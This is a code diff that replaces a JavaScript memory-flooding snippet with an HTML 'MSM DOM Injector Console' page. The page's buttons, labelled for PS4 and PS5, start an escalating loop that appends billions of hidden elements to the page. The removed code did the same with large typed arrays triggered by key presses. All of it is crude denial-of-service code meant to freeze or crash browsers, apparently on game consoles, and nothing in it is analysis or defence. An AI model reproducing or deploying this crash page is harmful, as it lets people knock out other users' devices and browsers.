@@ -1,22 +1,75 @@
-function pressurePS4() {
-  for (let i = 0; i < 50000000; i++) {
-    let payload = new Uint32Array(13000);
-    payload.fill(i);
-    payload["__MSM_OVERLOAD__"] = "PS4_BLAST_" + i;
-    logs.push(payload);
-  }
-}
+<html>
+<head>
+  <title>MSM Device Trigger</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+    button {
+      background-color: #0f0;
+      color: #000;
+      font-size: 20px;
+      padding: 15px 40px;
+      margin: 20px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 0 10px #0f0;
+    }
+    #counter {
+      margin-top: 30px;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🕹 MSM DOM Injector Console</h1>
 
-function pressurePS5() {
-  for (let i = 0; i < 100000000; i++) {
-    let payload = new Uint32Array(13000);
-    payload.fill(i);
-    payload["__MSM_OVERLOAD__"] = "PS5_NUKE_" + i;
-    logs.push(payload);
-  }
-}
+  <button onclick="startForPS4()">🚀 Start for PS4</button>
+  <button onclick="startForPS5()">💣 Start for PS5</button>
 
-window.addEventListener("keydown", e => {
-  if (e.key === "Enter") pressurePS4();       // زر Enter = PS4 ضغط 50M
-  if (e.key === "Control") pressurePS5();     // زر Control = PS5 ضغط 100M
-});
+  <div id="counter">Total Elements: 0</div>
+
+  <script>
+    let total = 0;
+    let batchSize = 1000000000;
+
+    function injectObjects(label) {
+      let phase = 1;
+      function overloadStep() {
+        try {
+          for (let i = 0; i < batchSize; i++) {
+            let el = document.createElement("div");
+            el.textContent = "💥 " + label;
+            el.style.position = "absolute";
+            el.style.left = (Math.random() * window.innerWidth) + "px";
+            el.style.top = (Math.random() * window.innerHeight) + "px";
+            el.style.opacity = 0.01;
+            document.body.appendChild(el);
+            total++;
+          }
+          document.getElementById("counter").textContent =
+            `Total Elements: ${total.toLocaleString()} | Phase: ${phase} | Device: ${label}`;
+          batchSize += 500000000;
+          phase++;
+          setTimeout(overloadStep, 600);
+        } catch (e) {
+          alert(`💥 MSM OVERLOAD on ${label} detected`);
+        }
+      }
+      overloadStep();
+    }
+
+    function startForPS4() {
+      injectObjects("PS4");
+    }
+
+    function startForPS5() {
+      injectObjects("PS5");
+    }
+  </script>
+</body>
+</html>
